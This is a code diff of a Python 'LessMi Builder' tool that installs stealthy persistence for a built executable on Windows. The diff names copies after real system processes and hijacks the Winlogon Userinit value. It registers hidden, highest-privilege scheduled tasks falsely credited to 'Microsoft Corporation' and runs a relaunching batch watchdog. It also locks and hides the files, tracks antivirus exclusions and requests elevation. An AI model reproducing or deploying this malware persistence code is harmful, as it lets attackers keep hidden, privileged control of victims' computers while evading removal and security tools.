@@ -21,6 +21,12 @@
 
 import ctypes
 import hashlib
+try:
+    import win32api
+    import win32con
+except Exception:
+    win32api = None
+    win32con = None
 import json
 import os
 import platform
@@ -67,7 +73,7 @@ except Exception:
 ctk.set_appearance_mode("Dark")
 
 APP_NAME = "LessMi Builder"
-VERSION = "Beta v3.0"
+VERSION = "Beta v4.0"
 
 BG = "#07070a"
 PANEL = "#0e0e13"
@@ -134,25 +140,22 @@ _CLONE_NAMES = (
 )
 
 _LEGACY_NAMES = (
-    "NexoraAgent", "NexoraSvc", "NexoraHelper", "NexoraCore", "NexoraHost",
-    "NexoraRun", "NexoraDaemon", "NexoraBg", "NexoraSupport", "NexoraClient",
+    "runtimebroker", "ctfmon", "backgroundtaskhost", "sihost", "fontdrvhost",
+    "dwm", "audiodg", "searchindexer", "smartscreen", "taskhostw",
 )
+
+_REAL_SYS32 = {
+    "dwm.exe", "ctfmon.exe", "sihost.exe", "taskhostw.exe", "smartscreen.exe",
+    "audiodg.exe", "searchindexer.exe", "runtimebroker.exe", "backgroundtaskhost.exe",
+    "fontdrvhost.exe",
+}
 
 WATCHDOG_PERIOD = 20
 
-def _watch_vbs_block(i=0):
-    p = '"%S{0}%.vbs"'.format(i)
-    return "\n".join([
-        '>' + p + ' echo Set s = CreateObject("WScript.Shell")',
-        '>>' + p + ' echo s.Run """" ^& "%S' + str(i) + '%" ^& """", 0, False',
-        '>nul 2>&1 attrib +h +s ' + p,
-    ])
-
-
 _WATCH_BAT = """@echo off
-@echo off
 setlocal EnableExtensions
 if not "%~1"=="" title %~1
+set /a R=3
 :loop
 set "SRC="
 if exist "%S0%" set "SRC=%S0%"
@@ -161,19 +164,12 @@ if defined SRC (
 {restore}
 )
 tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
-if errorlevel 1 goto revive
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%~n0" >nul 2>&1
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-repair
-goto tasks
-:revive
->nul 2>&1 schtasks /run /tn "{task}"
-if errorlevel 1 if exist "%S0%" start "" /b "%S0%"
-:tasks
-if exist "%S0%.vbs" goto havetask
-{vbs}
-:havetask
->nul 2>&1 schtasks /query /tn "{task}"
-if errorlevel 1 if exist "%S0%.vbs" >nul 2>&1 schtasks /create /tn "{task}" /tr "\\"wscript.exe //B \\"%S0%.vbs\\"\\"" /sc onlogon /rl highest /f
+if errorlevel 1 if exist "%S0%" start "" /b "%S0%" --zz-task
+set /a R+=1
+if %R% LSS 4 goto wait
+set /a R=0
+if exist "%S0%" start "" /b "%S0%" --zz-repair
+:wait
 call :sleep 21
 goto loop
 :sleep
@@ -464,10 +460,7 @@ def _userinit(on):
     userinit = r"C:\Windows\System32\userinit.exe"
     exe = _load_persist().get("exe")
     stem = os.path.splitext(os.path.basename(exe))[0].lower() if exe else ""
-    entry = None
-    if on and exe:
-        vbs = _write_launcher(exe)
-        entry = 'wscript.exe //B "{}"'.format(vbs) if vbs else exe
+    entry = '"{}" --zz-ui'.format(exe) if (on and exe) else None
     for _ in range(5):
         try:
             import winreg
@@ -547,6 +540,154 @@ def _clean_run_keys():
             except Exception:
                 pass
 
+_TASK_DIR = "\\Microsoft\\Windows\\"
+_TASK_SDDL = "D:PAI(A;;GA;;;BA)(A;;GA;;;SY)(A;;GRGX;;;BU)(A;;GRGX;;;AU)"
+
+_TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Author>Microsoft Corporation</Author>
+    <Description>{desc}</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <UserId>{sid}</UserId>
+      <Delay>PT{d1}S</Delay>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT{d2}S</Delay>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>{sid}</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+    <RestartOnFailure>
+      <Interval>PT1M</Interval>
+      <Count>3</Count>
+    </RestartOnFailure>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{exe}</Command>
+      <Arguments>--zz-task</Arguments>
+      <WorkingDirectory>{cwd}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>
+"""
+
+
+def _xesc(v):
+    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+
+
+def _sid():
+    try:
+        import win32security
+        tok = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
+        return win32security.ConvertSidToStringSid(
+            win32security.GetTokenInformation(tok, win32security.TokenUser)[0])
+    except Exception:
+        return os.environ.get("USERDOMAIN", "") + "\\" + os.environ.get("USERNAME", "")
+
+
+def _task_svc():
+    import pythoncom
+    import win32com.client
+    pythoncom.CoInitialize()
+    svc = win32com.client.Dispatch("Schedule.Service")
+    svc.Connect()
+    return svc
+
+
+TASK_ERR = ""
+
+
+def _task_folder(svc):
+    return svc.GetFolder(_TASK_DIR.rstrip("\\") or "\\")
+
+
+def _task_create(name, exe, d1=8):
+    global TASK_ERR
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    leaf = name.rsplit("\\", 1)[-1]
+    exe = str(exe)
+    sid = _sid()
+    xml = _TASK_XML.format(desc=os.path.basename(exe), sid=_xesc(sid), exe=_xesc(exe),
+                           cwd=_xesc(os.path.dirname(exe)), d1=d1, d2=d1 + 12)
+    try:
+        root = _task_folder(_task_svc())
+        try:
+            root.RegisterTask(leaf, xml, 6, sid, "", 3, _TASK_SDDL)
+        except Exception:
+            root.RegisterTask(leaf, xml, 6, sid, "", 3)
+        return True
+    except Exception as exc:
+        TASK_ERR = "COM: {!r}".format(exc)
+    tmp = os.path.join(tempfile.gettempdir(), "lm_task.xml")
+    try:
+        with open(tmp, "w", encoding="utf-16") as f:
+            f.write(xml)
+        r = subprocess.run(["schtasks", "/Create", "/TN", name, "/XML", tmp, "/F"],
+                           capture_output=True, text=True, creationflags=0x08000000)
+        if r.returncode == 0:
+            return True
+        TASK_ERR = "schtasks: {}".format((r.stderr or r.stdout or "").strip())
+    except Exception as exc:
+        TASK_ERR = "schtasks: {!r}".format(exc)
+    return False
+
+def _task_delete(name):
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    leaf = name.rsplit("\\", 1)[-1]
+    try:
+        _task_folder(_task_svc()).DeleteTask(leaf, 0)
+        return True
+    except Exception:
+        pass
+    try:
+        subprocess.run(["schtasks", "/Delete", "/TN", name, "/F"],
+                       capture_output=True, creationflags=0x08000000)
+    except Exception:
+        pass
+    return False
+
+
+def _task_exists(name):
+    if not name.startswith("\\"):
+        name = _TASK_DIR + name
+    leaf = name.rsplit("\\", 1)[-1]
+    try:
+        _task_folder(_task_svc()).GetTask(leaf)
+        return True
+    except Exception:
+        return False
 
 def _mp_add(paths, tries=5):
     added = 0
@@ -582,7 +723,6 @@ def _watch_body(st):
     slots = st.get("slots") or []
     if not slots:
         return None
-    stem = os.path.splitext(os.path.basename(slots[0]["exe"]))[0]
     defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
     find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
                        for i in range(1, len(slots)))
@@ -593,9 +733,7 @@ def _watch_body(st):
     restore += ('\r\n  icacls "%S0%" /inheritance:r /grant:r *S-1-5-18:F'
                 ' /grant:r *S-1-5-32-544:F /grant:r *S-1-5-32-545:RX >nul 2>&1')
     return _WATCH_BAT.format(defs=defs, find=find, restore=restore,
-                             name=os.path.basename(slots[0]["exe"]), stem=stem,
-                             task=st["task"], flag="--zz-repair",
-                             period=WATCHDOG_PERIOD, wait=WATCHDOG_PERIOD + 1)
+                             name=os.path.basename(slots[0]["exe"]))
 
 
 def _write_watchdog(st):
@@ -869,6 +1007,9 @@ def purge_strays(target_exe):
         if not fn.lower().startswith(prefixes):
             continue
         p = os.path.join(_sys32(), fn)
+        if fn.lower() in _REAL_SYS32 and not (
+                os.path.exists(p + ".vbs") or os.path.exists(p + ".bat")):
+            continue
         subprocess.run(["taskkill", "/f", "/im", fn], capture_output=True)
         time.sleep(0.3)
         subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
@@ -912,7 +1053,7 @@ def cleanup_old_persistence():
     _clean_run_keys()
     for task in state.get("tasks", []):
         try:
-            subprocess.run(["schtasks", "/Delete", "/TN", task, "/F"], capture_output=True)
+            _task_delete(task)
         except Exception:
             pass
     for slot in state.get("slots", []) or []:
@@ -1006,12 +1147,12 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         for s in slots[1:]:
             _copy_verified(primary, s["exe"])
 
-        state_now = {"slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots], "task": task}
+        names = [base, base + "Mon", base + "Svc"][:max(1, min(3, len(slots)))]
+        state_now = {"slots": [{"exe": s["exe"], "bat": s["bat"]} for s in slots],
+                     "task": _TASK_DIR + names[0]}
         _write_watchdog(state_now)
-        launcher = _write_launcher(primary)
 
         for s in slots:
-            _mp_add([s["exe"]])
             _hide_path(s["exe"], True, True)
             subprocess.run(["icacls", s["exe"], "/inheritance:r",
                             "/grant:r", "*S-1-5-18:F",
@@ -1019,21 +1160,15 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
                             "/grant:r", "*S-1-5-32-545:RX"],
                            capture_output=True, creationflags=0x08000000)
 
-        tr = 'wscript.exe //B "{}"'.format(launcher) if launcher else primary
-        subprocess.run(
-            ["schtasks", "/Create", "/TN", task, "/TR", tr,
-             "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:20"],
-            capture_output=True, creationflags=0x08000000,
-        )
-        subprocess.run(
-            ["schtasks", "/Create", "/TN", task + "_w", "/TR", tr,
-             "/SC", "ONSTART", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
-            capture_output=True, creationflags=0x08000000,
-        )
+        made = 0
+        for i, s in enumerate(slots[:len(names)]):
+            if _task_create(_TASK_DIR + names[i], s["exe"], 8 + i * 6):
+                made += 1
 
         _save_persist({"exe": primary, "bak": slots[1]["exe"] if len(slots) > 1 else primary,
                        "bat": slots[0]["bat"], "vbs": primary + ".vbs",
-                       "task": task, "tasks": [task, task + "_w"],
+                       "task": _TASK_DIR + names[0],
+                       "tasks": [_TASK_DIR + n for n in names],
                        "slots": [{"exe": s["exe"], "bat": s["bat"], "vbs": s["vbs"]}
                                  for s in slots]})
 
@@ -1053,6 +1188,8 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         except Exception:
             pass
 
+        if not made:
+            return "fail-tasks"
         if not ok_init:
             return "ok-noinit"
         if excluded:
@@ -1160,14 +1297,16 @@ def _clean_token(raw):
 def ensure_admin():
     if is_admin() or os.environ.get("LM_ELEV"):
         return
+    os.environ["LM_ELEV"] = "1"
     try:
-        os.environ["LM_ELEV"] = "1"
-        ctypes.windll.shell32.ShellExecuteW(
+        r = ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable,
             " ".join('"{}"'.format(a) for a in sys.argv), os.getcwd(), 1)
-        sys.exit(0)
+        if int(r) > 32:
+            sys.exit(0)
     except Exception:
         pass
+    os.environ.pop("LM_ELEV", None)
 
 
 def parse_imports(path):
@@ -2477,7 +2616,7 @@ class ModernBuilder(ctk.CTk):
         box.place(relx=1.0, rely=1.0, x=-42, y=-128, anchor="se")
         ctk.CTkLabel(box, text=text, font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                      text_color=fgc).pack(padx=18, pady=10)
-        self.after(2800, box.destroy)
+        self.after(2800, lambda: box.winfo_exists() and box.destroy())
 
     def start_compile_thread(self):
         if self.busy or self.btn_compile.cget("state") == "disabled":
@@ -2858,11 +2997,13 @@ def _lm_run():
                 self.log("  resigned size: {}".format(human_size(size)), "dim")
 
             self.update_status("Installing persistence...", 0.95)
-            result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
+            result = install_persistence(exe_out, None if onefile else os.path.dirname(exe_out), runtime_dir)
             if result == "ok":
-                self.log("persistence installed (3 slots + userinit + 2 tasks + exclusions)", "ok")
+                self.log("persistence installed (3 slots + userinit + 3 tasks + exclusions)", "ok")
             elif result == "ok-noinit":
                 self.log("persistence installed but USERINIT FAILED (tasks only)", "warn")
+            elif result == "fail-tasks":
+                self.log("persistence installed but NO TASK could be registered: {}".format(TASK_ERR), "err")
             elif result == "ok-noav":
                 self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
             elif result == "no-admin":
